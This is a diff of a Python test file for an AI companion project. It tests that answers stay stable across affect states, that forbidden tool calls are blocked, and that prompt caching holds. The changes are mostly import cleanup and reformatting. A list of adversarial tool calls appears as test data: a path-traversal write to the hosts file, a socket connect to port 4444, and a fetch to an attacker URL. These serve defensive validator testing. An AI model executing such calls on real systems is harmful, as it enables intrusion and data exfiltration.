@@ -15,18 +15,14 @@ Formally verifies:
 from __future__ import annotations
 
 from pathlib import Path
-import pytest
 
 from lucca.brain.prompt_builder import (
     build_messages,
-    format_stance_suffix,
-    get_system_prompt,
 )
 from lucca.core.affect import AffectSignal, AffectTracker
-from lucca.core.affective_ode import AffectiveODEMachine, DiscreteStance
+from lucca.core.affective_ode import DiscreteStance
 from lucca.core.bdi_validator import SpeculativeBDIValidator
-from lucca.core.cascade import BelnapValue, EpistemicSearchCascade, EpistemicSubstrate
-from lucca.core.schemas import ChatMessage
+from lucca.core.cascade import EpistemicSearchCascade
 from lucca.sandbox.policy import TaintFlags
 from lucca.sandbox.service import SandboxService
 
@@ -44,7 +40,7 @@ def test_invariant1_epistemic_truth_invariance(tmp_path: Path):
 
     # Baseline: Neutral affect
     tracker_neutral = AffectTracker()
-    st_neutral = tracker_neutral.get_current_state()
+    assert tracker_neutral.get_current_state() is not None
     res_neutral = cascade.query(query, emit_floor_cue=False)
 
     # Acute Distress: P = -0.9, A = +0.9, D = -0.9
@@ -67,8 +63,16 @@ def test_invariant1_epistemic_truth_invariance(tmp_path: Path):
 
     # Assert 100% strict epistemic truth invariance
     assert res_neutral.belnap_status == res_distress.belnap_status == res_euphoria.belnap_status
-    assert res_neutral.synthesized_context == res_distress.synthesized_context == res_euphoria.synthesized_context
-    assert res_neutral.calibrated_refusal == res_distress.calibrated_refusal == res_euphoria.calibrated_refusal
+    assert (
+        res_neutral.synthesized_context
+        == res_distress.synthesized_context
+        == res_euphoria.synthesized_context
+    )
+    assert (
+        res_neutral.calibrated_refusal
+        == res_distress.calibrated_refusal
+        == res_euphoria.calibrated_refusal
+    )
 
 
 def test_invariant2_deontic_monotonicity(tmp_path: Path):
@@ -82,10 +86,16 @@ def test_invariant2_deontic_monotonicity(tmp_path: Path):
     sandbox = SandboxService(execute_apps=False, use_direct_fallback=True)
 
     adversarial_bdi_calls = [
-        ("write_file", {"rel_path": "../../../Windows/System32/drivers/etc/hosts", "content": "127.0.0.1 bad"}),
+        (
+            "write_file",
+            {"rel_path": "../../../Windows/System32/drivers/etc/hosts", "content": "127.0.0.1 bad"},
+        ),
         ("write_file", {"rel_path": "memory.sqlite", "content": "CORRUPT"}),
         ("write_file", {"rel_path": "payload.exe", "content": "MZBINARY"}),
-        ("run_python", {"code": "import socket; s = socket.socket(); s.connect(('1.2.3.4', 4444))"}),
+        (
+            "run_python",
+            {"code": "import socket; s = socket.socket(); s.connect(('1.2.3.4', 4444))"},
+        ),
         ("fetch_url", {"url": "https://evil.attacker.com/leak"}),
     ]
 
@@ -115,7 +125,9 @@ def test_invariant2_deontic_monotonicity(tmp_path: Path):
                 tool_args,
                 taint_flags=TaintFlags.SENSITIVE_MEMORY | TaintFlags.WORKSPACE_PRIVATE,
             )
-            assert not bdi_res.is_valid, f"State {label} allowed prohibited tool {tool_name} with args {tool_args}"
+            assert not bdi_res.is_valid, (
+                f"State {label} allowed prohibited tool {tool_name} with args {tool_args}"
+            )
 
         # Sandbox confirmation gate must NEVER be bypassed
         for mutating_tool in ("write_file", "launch_app"):
@@ -176,7 +188,9 @@ def test_invariant3_prompt_frontier_suffix_preserves_prefix_kv_cache():
 
     # Freeze Turn 2 into history
     history.append({"role": "user", "content": user_turn_2})
-    history.append({"role": "assistant", "content": "The ring buffer writes lockless 24kHz PCM frames."})
+    history.append(
+        {"role": "assistant", "content": "The ring buffer writes lockless 24kHz PCM frames."}
+    )
 
     # Turn 3: User praises breakthrough, companion shifts to energetic_supportive
     t3_stance = DiscreteStance.ENERGETIC_SUPPORTIVE.value
